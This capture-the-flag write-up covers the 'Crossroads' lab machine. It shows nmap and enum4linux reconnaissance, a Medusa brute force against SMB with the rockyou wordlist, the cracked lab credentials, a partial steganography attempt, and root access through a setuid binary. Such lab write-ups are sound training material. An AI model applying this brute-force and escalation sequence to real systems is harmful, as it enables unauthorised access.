# Crossroads-CTF-Writeup



Category: Linux / SMB / Stego / Privilege Escalation
Difficulty: Medium
Author: @majoi
Target: Ubuntu 20.04 / Samba 4.9.5

Overview

The Crossroads challenge is a multi-step CTF involving:

SMB enumeration

File sharing exploitation

Steganography (hidden data in images)

Setuid binary privilege escalation

The goal was to capture two flags: one user flag and one root flag.

1. Initial Recon
1.1 Nmap Scan
nmap -sC -sV -p- 192.168.99.6

SMB (445) found

Web server (80) open

Samba version: 4.9.5-Debian

1.2 Enum4Linux
enum4linux -a 192.168.99.6

Findings:

Workgroup: WORKGROUP

User: albert

Shares: smbshare (writable), print$

2. SMB Enumeration & Access

Tested user access with Medusa:

medusa -h 192.168.99.6 -U users.txt -P /usr/share/wordlists/rockyou.txt -M smbnt

Result:

[+] ACCOUNT FOUND: albert / bradley1

Connected via smbclient:

smbclient //192.168.99.6/smbshare -U albert
Password: bradley1
3. Exploring SMB Share
ls
# smb.conf  smbscript.sh  test.txt

Read smb.conf → found magic script = smbscript.sh

Uploaded /etc/hosts for testing

Checked permissions and files

4. Discovering Hidden Data

Found crossroads.png in /home/albert

Attempted steganography:

binwalk -e crossroads.png

Extracted: 69F & 69F.zlib (compressed)

Tried decompressing with Python & zlib (some errors; file likely incomplete)

Additional files in _crossroads.png.extracted included audio and PNG chunks → likely red herrings or multi-layer steg

5. Local Privilege Escalation

Found setuid binary:

ls -l /home/albert
-rwsr-xr-x 1 root root 16664 Mar 2  2021 beroot

Binary type:

file beroot
# setuid ELF 64-bit LSB pie executable

Owned by root → could escalate

Exploited beroot to get root shell

./beroot
6. Capturing Flags
6.1 User Flag
cat /home/albert/user.txt
# flag 1/2: [ASCII ART FLAG]
6.2 Root Flag
cat /root/root.txt
# flag 2/2: [ASCII ART FLAG]
7. Summary

User credentials: albert / bradley1

Privilege escalation: beroot setuid binary

Flags captured:

User: /home/albert/user.txt

Root: /root/root.txt

Skills Practiced:

SMB enumeration & exploitation

File share manipulation

Basic steganography

Setuid privilege escalation
